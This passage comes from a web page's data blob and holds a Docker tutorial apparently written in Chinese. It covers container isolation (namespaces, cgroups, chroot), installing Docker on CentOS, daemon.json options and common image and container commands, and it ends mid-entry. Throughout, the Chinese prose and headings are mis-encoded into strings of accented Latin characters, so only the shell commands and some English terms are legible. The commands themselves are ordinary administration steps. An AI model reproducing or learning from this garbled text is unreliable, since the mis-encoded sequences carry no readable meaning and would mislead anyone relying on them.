å¸¸è§é®é¢å¤ç½®",slug:"docker-å¸¸è§é®é¢å¤ç½®",normalizedTitle:"docker å¸¸è§é®é¢å¤ç½®",charIndex:17690},{level:2,title:"Dockerfile",slug:"dockerfile",normalizedTitle:"dockerfile",charIndex:11480},{level:3,title:"ä»ä¹æ¯Dockerfile",slug:"ä»ä¹æ¯dockerfile",normalizedTitle:"ä»ä¹æ¯dockerfile",charIndex:18154},{level:3,title:"Dockerfileè§£æè¿ç¨",slug:"dockerfileè§£æè¿ç¨",normalizedTitle:"dockerfileè§£æè¿ç¨",charIndex:18278},{level:3,title:"Dockerfileçä¿çå½ä»¤",slug:"dockerfileçä¿çå½ä»¤",normalizedTitle:"dockerfileçä¿çå½ä»¤",charIndex:18299},{level:3,title:"Dockerfile æå Springbooté¡¹ç®",slug:"dockerfile-æå-springbooté¡¹ç®",normalizedTitle:"dockerfile æå springbooté¡¹ç®",charIndex:21293},{level:2,title:"æ¬å°éååå¸",slug:"æ¬å°éååå¸",normalizedTitle:"æ¬å°éååå¸",charIndex:21613},{level:3,title:"2. ä»Registryä¸­æåéå",slug:"_2-ä»registryä¸­æåéå",normalizedTitle:"2. ä»registryä¸­æåéå",charIndex:21849},{level:3,title:"3. å°éåæ¨éå°Registry",slug:"_3-å°éåæ¨éå°registry",normalizedTitle:"3. å°éåæ¨éå°registry",charIndex:21952},{level:3,title:"4. éæ©åéçéåä»åºå°å",slug:"_4-éæ©åéçéåä»åºå°å",normalizedTitle:"4. éæ©åéçéåä»åºå°å",charIndex:22256},{level:3,title:"5. ç¤ºä¾",slug:"_5-ç¤ºä¾",normalizedTitle:"5. ç¤ºä¾",charIndex:22400},{level:2,title:"é«çº§ç½ç»åå®¹å¨å·",slug:"é«çº§ç½ç»åå®¹å¨å·",normalizedTitle:"é«çº§ç½ç»åå®¹å¨å·",charIndex:22962},{level:3,title:"é«çº§ç½ç»éç½®",slug:"é«çº§ç½ç»éç½®",normalizedTitle:"é«çº§ç½ç»éç½®",charIndex:22975},{level:3,title:"é«çº§æ°æ®å·éç½®",slug:"é«çº§æ°æ®å·éç½®",normalizedTitle:"é«çº§æ°æ®å·éç½®",charIndex:25773},{level:2,title:"Docker compose",slug:"docker-compose",normalizedTitle:"docker compose",charIndex:26989},{level:3,title:"docker composeä½¿ç¨",slug:"docker-composeä½¿ç¨",normalizedTitle:"docker composeä½¿ç¨",charIndex:27008},{level:3,title:"docker-compose æ¨¡æ¿æä»¶",slug:"docker-compose-æ¨¡æ¿æä»¶",normalizedTitle:"docker-compose æ¨¡æ¿æä»¶",charIndex:28283},{level:3,title:"docker-compose å¸¸ç¨å½ä»¤",slug:"docker-compose-å¸¸ç¨å½ä»¤",normalizedTitle:"docker-compose å¸¸ç¨å½ä»¤",charIndex:31994},{level:2,title:"dockerå¯è§åå·¥å·",slug:"dockerå¯è§åå·¥å·",normalizedTitle:"dockerå¯è§åå·¥å·",charIndex:34233}],excerpt:'<h1 id="docker"><a class="header-anchor" href="#docker">#</a> Docker</h1>\n<h2 id="docker-çå¿µ"><a class="header-anchor" href="#docker-çå¿µ">#</a> Docker çå¿µ</h2>\n<blockquote>\n<p>Dockerçä¸»è¦ç®æ æ¯âBuildï¼Ship and Run Any App,Anywhereâï¼ä¹å°±æ¯éè¿å¯¹åºç¨ç»ä»¶çå°è£ãååãé¨ç½²ãè¿è¡ç­çå½å¨æçç®¡çï¼ä½¿ç¨æ·çAPPï¼å¯ä»¥æ¯ä¸ä¸ªWEBåºç¨ææ°æ®åºåºç¨ç­ç­ï¼åå¶è¿è¡ç¯å¢è½å¤åå°âä¸æ¬¡å°è£ï¼å°å¤è¿è¡âãè§£å³äºè¿è¡ç¯å¢åéç½®é®é¢è½¯ä»¶å®¹å¨ï¼æ¹ä¾¿åæç»­éæå¹¶æå©äºæ´ä½åå¸çå®¹å¨èæåææ¯ã</p>\n</blockquote>\n<p><img src="https://wiki-1251603812.cos.ap-shanghai.myqcloud.com/images/image-20220129195048442.png" alt="image-20220129195048442"></p>\n',headersStr:"Docker çå¿µ Linuxå®¹å¨çå®ç°æ¹å¼ NameSpace Cgroups Chroot Dockeråèææºçåºå« èææº Docker Dockerçä¼å¿ ç¸å³æ¦å¿µ éå å®¹å¨ ä»åº Centoså®è£Docker 1. å¸è½½æ§çæ¬Docker 2. è®¾ç½®éåä»åº 3. å®è£Docker 4. éç½®éåå é 5. å¯å¨Dockerå¹¶æµè¯ 6. Docker Runé»è¾å¾ 99. å¸è½½æ¹å¼ Docker å¸¸ç¨å½ä»¤ å¸®å©ç¸å³ éåç¸å³å½ä»¤ å®¹å¨ç¸å³å½ä»¤ éå UnionFS - èåæä»¶ç³»ç» Dockeréåå è½½åç Docker commit å®¹å¨æ°æ®å· å½ä»¤è¡åå»ºå®¹å¨æ°æ®å· Dockerfileåå»ºå®¹å¨æ°æ®å· æ°æ®å·å®¹å¨ Dockerå®è£å¸¸è§çæå¡ Docker å®è£ Mysql Dockerå®è£Redis Docker å®è£ nginx Docker å®è£ Tomcat Docker å®è£ ES Docker å¸¸è§é®é¢å¤ç½® Dockerfile ä»ä¹æ¯Dockerfile Dockerfileè§£æè¿ç¨ Dockerfileçä¿çå½ä»¤ Dockerfile æå Springbooté¡¹ç® æ¬å°éååå¸ 2. ä»Registryä¸­æåéå 3. å°éåæ¨éå°Registry 4. éæ©åéçéåä»åºå°å 5. ç¤ºä¾ é«çº§ç½ç»åå®¹å¨å· é«çº§ç½ç»éç½® é«çº§æ°æ®å·éç½® Docker compose docker composeä½¿ç¨ docker-compose æ¨¡æ¿æä»¶ docker-compose å¸¸ç¨å½ä»¤ dockerå¯è§åå·¥å·",content:'# Docker\n\n\n# Docker çå¿µ\n\n> Dockerçä¸»è¦ç®æ æ¯âBuildï¼Ship and Run Any App,Anywhereâï¼ä¹å°±æ¯éè¿å¯¹åºç¨ç»ä»¶çå°è£ãååãé¨ç½²ãè¿è¡ç­çå½å¨æçç®¡çï¼ä½¿ç¨æ·çAPPï¼å¯ä»¥æ¯ä¸ä¸ªWEBåºç¨ææ°æ®åºåºç¨ç­ç­ï¼åå¶è¿è¡ç¯å¢è½å¤åå°âä¸æ¬¡å°è£ï¼å°å¤è¿è¡âãè§£å³äºè¿è¡ç¯å¢åéç½®é®é¢è½¯ä»¶å®¹å¨ï¼æ¹ä¾¿åæç»­éæå¹¶æå©äºæ´ä½åå¸çå®¹å¨èæåææ¯ã\n\n\n\n\n# Linuxå®¹å¨çå®ç°æ¹å¼\n\n> ä¸ä¸ªæ­£å¨è¿è¡ç Docker å®¹å¨ï¼å¶å®å°±æ¯ä¸ä¸ªå¯ç¨äºå¤ä¸ª Linux Namespace çåºç¨è¿ç¨ï¼èè¿ä¸ªè¿ç¨è½å¤ä½¿ç¨çèµæºéï¼åå Cgroups éç½®çéå¶ãè¿ä¹æ¯å®¹å¨ææ¯ä¸­ä¸ä¸ªéå¸¸éè¦çæ¦å¿µï¼å³ï¼å®¹å¨æ¯ä¸ä¸ªâåè¿ç¨âæ¨¡åã\n\nä¸ä¸ªâå®¹å¨âï¼å®éä¸æ¯ä¸ä¸ªç± Linux NamespaceãLinux Cgroups å rootfs ä¸ç§ææ¯æå»ºåºæ¥çè¿ç¨çéç¦»ç¯å¢ã\n\n 1. Namespace çä½ç¨æ¯âéç¦»âï¼å®è®©åºç¨è¿ç¨åªè½çå°è¯¥ Namespace åçâä¸çâï¼ä¿®æ¹è¿ç¨è§å¾çä¸»è¦æ¹æ³\n\n 2. Cgroups çä½ç¨æ¯âéå¶âï¼å®ç»è¿ä¸ªâä¸çâå´ä¸äºä¸åçä¸è§çå¢ãå¶é çº¦æçä¸»è¦ææ®µ\n\n 3. ä¸ç»èåæè½½å¨ /var/lib/docker/aufs/mnt ä¸ç rootfsï¼è¿ä¸é¨åæä»¬ç§°ä¸ºâå®¹å¨éåâï¼Container Imageï¼ï¼æ¯å®¹å¨çéæè§å¾ï¼ä¸ä¸ªç± Namespace+Cgroups ææçéç¦»ç¯å¢ï¼è¿ä¸é¨åæä»¬ç§°ä¸ºâå®¹å¨è¿è¡æ¶âï¼Container Runtimeï¼ï¼æ¯å®¹å¨çå¨æè§å¾ã\n\n\n# NameSpace\n\nå¨å®¹å¨ä¸­çå°åªæèªå·±ä¸ä¸ªè¿ç¨ï¼ä½æ¯è¿ä¸ªè¿ç¨å¶å®æ¯å¨å®¿ä¸»æºä¸ç åªä¸è¿æ¯ä¸ä¸ªç¬ç«çnamespace\n\nå®ä¹äº5ä¸ªå½åç©ºé´ç»æä½ï¼å¤ä¸ªè¿ç¨å¯ä»¥ä½¿ç¨åä¸ä¸ªnamespace\n\n 1. UTSï¼ è¿è¡åæ ¸çåç§°ãçæ¬ãåºå±ä½ç³»ç»æç±»åç­ä¿¡æ¯ï¼UNIX Timesharing Systemï¼\n\n 2. IPCï¼ ä¸è¿ç¨é´éä¿¡ï¼IPC)æå³\n\n 3. MNTï¼å·²ç»è£è½½çæä»¶ç³»ç»çè§å¾ Mount Namespaceï¼ç¨äºè®©è¢«éç¦»è¿ç¨åªçå°å½å Namespace éçæè½½ç¹ä¿¡æ¯ï¼\n\n 4. PIDï¼æå³è¿ç¨IDçä¿¡æ¯\n\n 5. NETï¼ç½ç»ç¸å³çå½åç©ºé´åæ° Network Namespaceï¼ç¨äºè®©è¢«éç¦»è¿ç¨çå°å½å Namespace éçç½ç»è®¾å¤åéç½®ã\n\nå¨ Linux åæ ¸ä¸­ï¼æå¾å¤èµæºåå¯¹è±¡æ¯ä¸è½è¢« Namespace åçï¼æå¸åçä¾å­å°±æ¯ï¼æ¶é´ã\n\nä¸ºäºè®©å¤ä¸ªå®¹å¨ä»¥æ²ççæ¹å¼å¨å®¿ä¸»æºä¸è¿è¡ï¼å°±éè¦æåå®ä¹å¥½åä¸ªå®¹å¨è½çå°çè¾¹çãç±äºåä¸ªå®¹å¨é½æ¯ç´æ¥è¿è¡å¨å®¿ä¸»æºç³»ç»ä¸ï¼å æ­¤éè¦åæ ¸å¯¹åä¸ªå®¹å¨çä¸ä¸æè¿è¡ä¿®æ¹ï¼è®©ä»ä»¬çä¸å»æ¯ä¸ä¸ªç¬ç«çæä½ç³»ç»ãæ¯å¦ï¼æå®PIDä¸º1çè¿ç¨ï¼æå®ç½å¡è®¾å¤ï¼æå®æä»¶ç³»ç»æè½½ï¼æå®ç¨æ·ç­ç­ã\n\nLinuxæä½ç³»ç»åæ ¸ä»åºå±å®ç°äºä¸ºåä¸ªè¿ç¨åå»ºç¬ç«ç¨æ·ç©ºé´çåè½ï¼ä¸åç¨æ·ç©ºé´ä¼¼äºä¸ä¸ªä¸ªç¬ç«çèææºç³»ç»ï¼ç¨æ·ç©ºé´åé¨è¿ç¨ä¸è½æç¥å°å¶å®ç¨æ·ç©ºé´ä¸­çè¿ç¨ç¶æãåæ ¸æä¾äºå­ç§Namespacesã\n\nUTS     HOSTNAME AND DOMAINNAME    ä¸»æºååååéç¦»                åæ ¸çæ¬ï¼2.6.19\nUser                               ç¨æ·éç¦»ãè¿è¡è¿ç¨çç¨æ·åç»          åæ ¸çæ¬ï¼3.8.x\nMount                              æè½½ç¹éç¦»ãå³æè½½ç¹éç¦»ï¼ä¸»è¦ææ ¹ç®å½     åæ ¸çæ¬ï¼2.4.19\nIPC     Inter-process-connection   è¿ç¨é´éä¿¡éç¦»ãæ¶æ¯éåãå±äº«åå®¹ãä¿¡å·é   åæ ¸çæ¬ï¼2.6.19\nPid     Process                                            \nID                                 PIDéç¦»                   \nNet     Network                    ç½ç»éç¦»ãç½ç»è®¾å¤ãåè®®æ ãç«¯å£        åæ ¸çæ¬ï¼2.6.29\n\n\n# Cgroups\n\nLinux Cgroups å°±æ¯ Linux åæ ¸ä¸­ç¨æ¥ä¸ºè¿ç¨è®¾ç½®èµæºéå¶çä¸ä¸ªéè¦åè½ã\n\nLinux Cgroups çå¨ç§°æ¯ Linux Control Groupãå®æä¸»è¦çä½ç¨ï¼å°±æ¯éå¶ä¸ä¸ªè¿ç¨ç»è½å¤ä½¿ç¨çèµæºä¸éï¼åæ¬ CPUãåå­ãç£çãç½ç»å¸¦å®½ç­ç­ã\n\næ­¤å¤ï¼Cgroups è¿è½å¤å¯¹è¿ç¨è¿è¡ä¼åçº§è®¾ç½®ãå®¡è®¡ï¼ä»¥åå°è¿ç¨æèµ·åæ¢å¤ç­æä½ã\n\n\n# Chroot\n\nå¦æéè¦å¨ä¸ä¸ªå®¿ä¸»æºä¸è¿è¡å¤ä¸ªå®¹å¨ï¼ä¸å®¹å¨ä¹é´ç¸äºéç¦»ï¼é£ä¹ç¬¬ä¸ä¸ªå°±éè¦ç³»ç»åºæä»¶çä¾èµï¼å¯¹äºä¸ä¸ªå®¹å¨èè¨ï¼éè¦å°å¶éè¦çç³»ç»æä»¶åç¬å¤å¶åºæ¥ä¸ä»½ï¼æ¾å°æå®ç®å½ï¼å¹¶ä¸éè¦è®©è¿ç¨è®¤ä¸ºè¿å°±æ¯æ ¹ç®å½ï¼èä¸æ¯å»è°ç¨å®¿ä¸»æºç³»ç»ä¸çåºæä»¶ãChrootå°±æ¯ä¸ä¸ªåæ¢æ ¹ç®å½çæ¹å¼ã\n\n\n# Dockeråèææºçåºå«\n\næ¯è¾äº Docker åä¼ ç»èæåæ¹å¼çä¸åä¹å¤ï¼\n\n * ä¼ ç»èææºææ¯æ¯èæåºä¸å¥ç¡¬ä»¶åï¼å¨å¶ä¸è¿è¡ä¸ä¸ªå®æ´æä½ç³»ç»ï¼å¨è¯¥ç³»ç»ä¸åè¿è¡æéåºç¨è¿ç¨ï¼\n\n * èå®¹å¨åçåºç¨è¿ç¨ç´æ¥è¿è¡äºå®¿ä¸»çåæ ¸ï¼å®¹å¨åæ²¡æèªå·±çåæ ¸ï¼ èä¸ä¹æ²¡æè¿è¡ç¡¬ä»¶èæãå æ­¤å®¹å¨è¦æ¯ä¼ ç»èææºæ´ä¸ºè½»ä¾¿ã\n\n * æ¯ä¸ªå®¹å¨ä¹é´äºç¸éç¦»ï¼æ¯ä¸ªå®¹å¨æèªå·±çæä»¶ç³»ç» ï¼å®¹å¨ä¹é´è¿ç¨ä¸ä¼ç¸äºå½±åï¼è½åºåè®¡ç®èµæºã\n\n\n# èææº\n\nå®å¯ä»¥å¨ä¸ç§æä½ç³»ç»éé¢è¿è¡å¦ä¸ç§æä½ç³»ç»ï¼æ¯å¦å¨Windows ç³»ç»éé¢è¿è¡Linux ç³»ç»ãåºç¨ç¨åºå¯¹æ­¤æ¯«æ æç¥ï¼å ä¸ºèææºçä¸å»è·çå®ç³»ç»ä¸æ¨¡ä¸æ ·ï¼èå¯¹äºåºå±ç³»ç»æ¥è¯´ï¼èææºå°±æ¯ä¸ä¸ªæ®éæä»¶ï¼ä¸éè¦äºå°±å æï¼å¯¹å¶ä»é¨åæ¯«æ å½±åãè¿ç±»èææºå®ç¾çè¿è¡äºå¦ä¸å¥ç³»ç»ï¼è½å¤ä½¿åºç¨ç¨åºï¼æä½ç³»ç»åç¡¬ä»¶ä¸èä¹é´çé»è¾ä¸åã\n\nèææºçç¼ºç¹ï¼\n\n * èµæºå ç¨å¤\n * åä½æ­¥éª¤å¤\n * å¯å¨æ¢\n\n\n\n\n# Docker\n\nLinux å®¹å¨ä¸æ¯æ¨¡æä¸ä¸ªå®æ´çæä½ç³»ç»ï¼èæ¯å¯¹è¿ç¨è¿è¡éç¦»ãæäºå®¹å¨ï¼å°±å¯ä»¥å°è½¯ä»¶è¿è¡æéçææèµæºæåå°ä¸ä¸ªéç¦»çå®¹å¨ä¸­ãå®¹å¨ä¸èææºä¸åï¼ä¸éè¦æç»ä¸æ´å¥æä½ç³»ç»ï¼åªéè¦è½¯ä»¶å·¥ä½æéçåºèµæºåè®¾ç½®ãç³»ç»å æ­¤èåå¾é«æè½»éå¹¶ä¿è¯é¨ç½²å¨ä»»ä½ç¯å¢ä¸­çè½¯ä»¶é½è½å§ç»å¦ä¸å°è¿è¡ã\n\n\n\n\n# Dockerçä¼å¿\n\nDockeræ¯ä¸ä¸ªClient-Serverç»æçç³»ç»ï¼Dockerå®æ¤è¿ç¨è¿è¡å¨ä¸»æºä¸ï¼ ç¶åéè¿Socketè¿æ¥ä»å®¢æ·ç«¯è®¿é®ï¼å®æ¤è¿ç¨ä»å®¢æ·ç«¯æ¥åå½ä»¤å¹¶ç®¡çè¿è¡å¨ä¸»æºä¸çå®¹å¨ã å®¹å¨ï¼æ¯ä¸ä¸ªè¿è¡æ¶ç¯å¢ï¼å°±æ¯æä»¬åé¢è¯´å°çéè£ç®±ãdockeræçæ¯èææºæ´å°çæ½è±¡å±ãç±äºdockerä¸éè¦Hypervisorå®ç°ç¡¬ä»¶èµæºèæå,è¿è¡å¨dockerå®¹å¨ä¸çç¨åºç´æ¥ä½¿ç¨çé½æ¯å®éç©çæºçç¡¬ä»¶èµæºãå æ­¤å¨CPUãåå­å©ç¨çä¸dockerå°ä¼å¨æçä¸æææ¾ä¼å¿ãdockerå©ç¨çæ¯å®¿ä¸»æºçåæ ¸,èä¸éè¦Guest OSãå æ­¤,å½æ°å»ºä¸ä¸ªå®¹å¨æ¶,dockerä¸éè¦åèææºä¸æ ·éæ°å è½½ä¸ä¸ªæä½ç³»ç»åæ ¸ãä»èé¿åå¼å¯»ãå è½½æä½ç³»ç»åæ ¸è¿ä¸ªæ¯è¾è´¹æ¶è´¹èµæºçè¿ç¨,å½æ°å»ºä¸ä¸ªèææºæ¶,èææºè½¯ä»¶éè¦å è½½Guest OS,è¿ä¸ªæ°å»ºè¿ç¨æ¯åéçº§å«çãèdockerç±äºç´æ¥å©ç¨å®¿ä¸»æºçæä½ç³»ç»,åçç¥äºè¿ä¸ªè¿ç¨,å æ­¤æ°å»ºä¸ä¸ªdockerå®¹å¨åªéè¦å ç§éã\n\n\n\n\n# ç¸å³æ¦å¿µ\n\néè¦æ­£ç¡®ççè§£ä»å¨/éå/å®¹å¨è¿å ä¸ªæ¦å¿µ:\n\nDocker æ¬èº«æ¯ä¸ä¸ªå®¹å¨è¿è¡è½½ä½æç§°ä¹ä¸ºç®¡çå¼æãæä»¬æåºç¨ç¨åºåéç½®ä¾èµæåå¥½å½¢æä¸ä¸ªå¯äº¤ä»çè¿è¡ç¯å¢ï¼è¿ä¸ªæåå¥½çè¿è¡ç¯å¢å°±ä¼¼ä¹ imageéåæä»¶ãåªæéè¿è¿ä¸ªéåæä»¶æè½çæ Docker å®¹å¨ãimage æä»¶å¯ä»¥çä½æ¯å®¹å¨çæ¨¡æ¿ãDocker æ ¹æ® image æä»¶çæå®¹å¨çå®ä¾ãåä¸ä¸ª image æä»¶ï¼å¯ä»¥çæå¤ä¸ªåæ¶è¿è¡çå®¹å¨å®ä¾ã\n\n * image æä»¶çæçå®¹å¨å®ä¾ï¼æ¬èº«ä¹æ¯ä¸ä¸ªæä»¶ï¼ç§°ä¸ºéåæä»¶ã\n * ä¸ä¸ªå®¹å¨è¿è¡ä¸ç§æå¡ï¼å½æä»¬éè¦çæ¶åï¼å°±å¯ä»¥éè¿dockerå®¢æ·ç«¯åå»ºä¸ä¸ªå¯¹åºçè¿è¡å®ä¾ï¼ä¹å°±æ¯æä»¬çå®¹å¨\n * è³äºä»å¨ï¼å°±æ¯æ¾äºä¸å éåçå°æ¹ï¼æä»¬å¯ä»¥æéååå¸å°ä»å¨ä¸­ï¼éè¦çæ¶åä»ä»å¨ä¸­æä¸æ¥å°±å¯ä»¥äºã\n\n\n\n\n# éå\n\nDocker éåï¼Imageï¼å°±æ¯ä¸ä¸ªåªè¯»çæ¨¡æ¿ãéåå¯ä»¥ç¨æ¥åå»º Docker å®¹å¨ï¼ä¸ä¸ªéåå¯ä»¥åå»ºå¾å¤å®¹å¨ã\n\ndockeréåçå½åæ åï¼\n\n${registry_ name}/${repository. name}/${image. name}:${tag. name}\ndocker.io/library/alpine:3.10.1\n\n\n1\n2\n\n\n\n# å®¹å¨\n\nDocker å©ç¨å®¹å¨ï¼Containerï¼ç¬ç«è¿è¡çä¸ä¸ªæä¸ç»åºç¨ãå®¹å¨æ¯ç¨éååå»ºçè¿è¡å®ä¾ã\n\nå®å¯ä»¥è¢«å¯å¨ãå¼å§ãåæ­¢ãå é¤ãæ¯ä¸ªå®¹å¨é½æ¯ç¸äºéç¦»çãä¿è¯å®å¨çå¹³å°ã å¯ä»¥æå®¹å¨çåæ¯ä¸ä¸ªç®æçç Linux ç¯å¢ï¼åæ¬rootç¨æ·æéãè¿ç¨ç©ºé´ãç¨æ·ç©ºé´åç½ç»ç©ºé´ç­ï¼åè¿è¡å¨å¶ä¸­çåºç¨ç¨åºã\n\nå®¹å¨çå®ä¹åéåå ä¹ä¸æ¨¡ä¸æ ·ï¼ä¹æ¯ä¸å å±çç»ä¸è§è§ï¼å¯ä¸åºå«å¨äºå®¹å¨çæä¸é¢é£ä¸å±æ¯å¯è¯»å¯åçã\n\n\n# ä»åº\n\nä»åºï¼Repositoryï¼æ¯éä¸­å­æ¾éåæä»¶çåºæã\n\nä»åº(Repository)åä»åºæ³¨åæå¡å¨ï¼Registryï¼æ¯æåºå«çãä»åºæ³¨åæå¡å¨ä¸å¾å¾å­æ¾çå¤ä¸ªä»åºï¼æ¯ä¸ªä»åºä¸­ååå«äºå¤ä¸ªéåï¼æ¯ä¸ªéåæä¸åçæ ç­¾ï¼tagï¼ã\n\nä»åºåä¸ºå¬å¼ä»åºï¼Publicï¼åç§æä»åºï¼Privateï¼ä¸¤ç§å½¢å¼ã\n\næå¤§çå¬å¼ä»åºæ¯ Docker Hubï¼å­æ¾äºæ°éåºå¤§çéåä¾ç¨æ·ä¸è½½ãå½åçå¬å¼ä»åºåæ¬é¿éäº ãç½æäºç­ã\n\n\n# Centoså®è£Docker\n\n\n# 1. å¸è½½æ§çæ¬Docker\n\nsudo yum remove docker \\\n                  docker-client \\\n                  docker-client-latest \\\n                  docker-common \\\n                  docker-latest \\\n                  docker-latest-logrotate \\\n                  docker-logrotate \\\n                  docker-engine\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 2. è®¾ç½®éåä»åº\n\nsudo yum install -y yum-utils\nsudo yum-config-manager \\\n    --add-repo \\\n    https://download.docker.com/linux/centos/docker-ce.repo\n\n\n1\n2\n3\n4\n\n\n\n# 3. å®è£Docker\n\n sudo yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin\n\n\n1\n\n\n\n# 4. éç½®éåå é\n\nsudo mkdir -p /etc/docker\nsudo tee /etc/docker/daemon.json <<-\'EOF\'\n{\n  "registry-mirrors": ["https://t9rco7kp.mirror.aliyuncs.com"]\n}\nEOF\nsudo systemctl daemon-reload\n\n# å¶ä»éç½®\n\n# daemon.json éç½®ä»ç»\n{\n  "graph": "/data/docker",\n  "storage-driver": "overlay2",\n  "insecure-registries": ["registry.access.redhat.com","quay.io"],\n  "registry-mirrors": ["https://q2gr04ke.mirror.aliyuncs.com>"],\n  "bip": "172.24.38.1/24",\n  "exec-opts": ["native.cgroupdriver=systemd"],\n  "live-restore": true\n}\n\n# éç½®é¡¹æ³¨æç¹ï¼\n# graph: è¯¥å³é®å­æªæ¥å°è¢«å¼ç¨ï¼å¯ä»¥éç¨ "data-root" æ¿ä»£\n# storage-driver: å­å¨é©±å¨ï¼å³åå±æä»¶ç³»ç»\n# insecure-registries: ä¸å®å¨çdocker registriesï¼å³ä½¿ç¨httpåè®®æ¨æéè±¡\n# registry-mirrors: å éç«ç¹ï¼ä¸è¬å¯ä»¥ä½¿ç¨é¿éãç½æäºãdockerä¸­å½(<https://registry.docker-cn.com>)çå°å\n# bip: æå®docker bridgeå°å(ä¸è½ä»¥.0ç»å°¾)ï¼çäº§ä¸­å»ºè®®éç¨ 172.xx.yy.1/24,å¶ä¸­xx.yyä¸ºå®¿ä¸»æºipååä½ï¼æ¹ä¾¿å®ä½é®é¢\n# è¥å¯å¨å¤±è´¥ï¼æ¥ç /var/log/message æ¥å¿æé\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 5. å¯å¨Dockerå¹¶æµè¯\n\nsudo systemctl restart docker\ndocker run hello-world\n\n\n1\n2\n\n\n\n# 6. Docker Runé»è¾å¾\n\n\n\n\n# 99. å¸è½½æ¹å¼\n\nsystemctl stop docker \nyum -y remove docker-ce\nrm -rf /var/lib/docker\n\n\n1\n2\n3\n\n\n\n# Docker å¸¸ç¨å½ä»¤\n\n\n\n\n# å¸®å©ç¸å³\n\n# æ¥ççæ¬\n\ndocker version\n\n\n1\n\n\n\n\n# æ¥çdockerä¿¡æ¯\n\ndocker info\n\n\n1\n\n\n\n\n# æ¥çå¸®å©\n\ndocker --help\n\n\n1\n\n\n\n# éåç¸å³å½ä»¤\n\n# 1.æ¥çæ¬æºä¸­ææéå\ndocker images\t--------------------------\tååºæ¬å°ææéå\n-a\t\t\tååºææéåï¼åå«ä¸­é´æ åå±ï¼\n-q\t\t\tåªæ¾ç¤ºéåid\n\n# 2.æç´¢éå\ndocker search [options] éåå\t-------------------\tå»dockerhubä¸æ¥è¯¢å½åéå\n-s æå®å¼\t\tååºæ¶èæ°ä¸å°äºæå®å¼çéå\n--no-trunc\t  æ¾ç¤ºå®æ´çéåä¿¡æ¯\n\n# 3.ä»ä»åºä¸è½½éå\ndocker pull éåå[:TAG|@DIGEST]\t----------------- ä¸è½½éå\n\n# 4.å é¤éå\ndocker rmi éåå\t--------------------------  å é¤éå\n-f\t\tå¼ºå¶å é¤\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# ç»å½éåºDockerHub\n\ndocker login docker.io\ncat /root/.docker/config.json\n\n\n1\n2\n\n\n\n\n# åä¸¾ç³»ç»ä¸çéå\n\ndocker images\noptionsï¼\n\t-a   æ¾ç¤ºæ¬æºææéå\n\t-q   åªæ¾ç¤ºid\n\t--digest  åªæ¾ç¤ºæè¦ä¿¡æ¯\n\t--no-trunc æ¾ç¤ºå®æ´éåä¿¡æ¯\n\n\n1\n2\n3\n4\n5\n6\n\n\n# æ¥æ¾éå\n\ndocker search xxx\noptions:\n\t--no-strunc æ¾ç¤ºå®æ´çéåä¿¡æ¯\n\n\n1\n2\n3\n\n\n# æåéå\n\ndocker pull xxx[:çæ¬]\n\n\n1\n\n\n# å é¤éå\n\ndocker rmi xxx\n\neg.\ndocker rmi centos å é¤ä¸ä¸ªéå\ndocker rmi centos:latest centos:7.1 å é¤å¤ä¸ª\ndocker rmi $(docker images -aq) å é¤å¨é¨\ndocker rmi -f xxx å¼ºå¶å é¤\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# éåæ ç­¾\n\ndocker tag d4ff818577bc docker.io/zhangsan404/alpine:latest\n\n\n1\n\n\n\n\n# æ¨ééåå°è¿ç«¯\n\ndocker push docker.io/zhangsan404/alpine:latest\n\n\n1\n\n\n# ä¿å­éåå°æ¬å°\n\ndocker save zhangsan404/alpine:test > alpine_test.tar\n\n\n1\n\n\n\n\n# æ¬å°éåå¯¼å¥\n\ndocker load < alpine_test.tar\n\n\n1\n\n\n\n\n\n# å®¹å¨ç¸å³å½ä»¤\n\n# 1.è¿è¡å®¹å¨\ndocker run éåå\t--------------------------\téååæ°å»ºå¹¶å¯å¨å®¹å¨\n--name \t\t\t\t\tå«åä¸ºå®¹å¨èµ·ä¸ä¸ªåå­\n-d\t\t\t\t\t\t\tå¯å¨å®æ¤å¼å®¹å¨ï¼å¨åå°å¯å¨å®¹å¨ï¼\n-p \t\t\t\t\t\t\tæ å°ç«¯å£å·ï¼åå§ç«¯å£å·\t\t æå®ç«¯å£å·å¯å¨\n\nä¾ï¼docker run -it --name myTomcat -p 8888:8080 tomcat\ndocker run -d --name myTomcat -P tomcat\n\n# 2.æ¥çè¿è¡çå®¹å¨\ndocker ps\t\t\t\t\t--------------------------\tååºæææ­£å¨è¿è¡çå®¹å¨\n-a\t\t\tæ­£å¨è¿è¡çååå²è¿è¡è¿çå®¹å¨\n-q\t\t\téé»æ¨¡å¼ï¼åªæ¾ç¤ºå®¹å¨ç¼å·\n\n# 3.åæ­¢|å³é­|éå¯å®¹å¨\ndocker start   å®¹å¨åå­æèå®¹å¨id  --------------- å¼å¯å®¹å¨\ndocker restart å®¹å¨åæèå®¹å¨id    --------------- éå¯å®¹å¨\ndocker stop  å®¹å¨åæèå®¹å¨id \t    ------------------ æ­£å¸¸åæ­¢å®¹å¨è¿è¡\ndocker kill  å®¹å¨åæèå®¹å¨id      ------------------ ç«å³åæ­¢å®¹å¨è¿è¡\n\n# 4.å é¤å®¹å¨\ndocker rm -f å®¹å¨idåå®¹å¨å     \ndocker rm -f $(docker ps -aq)\t\t--------------------------\tå é¤ææå®¹å¨\n\n# 5.æ¥çå®¹å¨åè¿ç¨\ndocker top å®¹å¨idæèå®¹å¨å ------------------ æ¥çå®¹å¨åçè¿ç¨\n\n# 6.æ¥çæ¥çå®¹å¨åé¨ç»è\ndocker inspect å®¹å¨id \t\t------------------ æ¥çå®¹å¨åé¨ç»è\n\n# 7.æ¥çå®¹å¨çè¿è¡æ¥å¿\ndocker logs [OPTIONS] å®¹å¨idæå®¹å¨å\t------------------ æ¥çå®¹å¨æ¥å¿\n-t\t\t\t å å¥æ¶é´æ³\n-f\t\t\t è·éææ°çæ¥å¿æå°\n--tail \t æ°å­\tæ¾ç¤ºæåå¤å°æ¡\n\n# 8.è¿å¥å®¹å¨åé¨\ndocker exec [options] å®¹å¨id å®¹å¨åå½ä»¤ ------------------ è¿å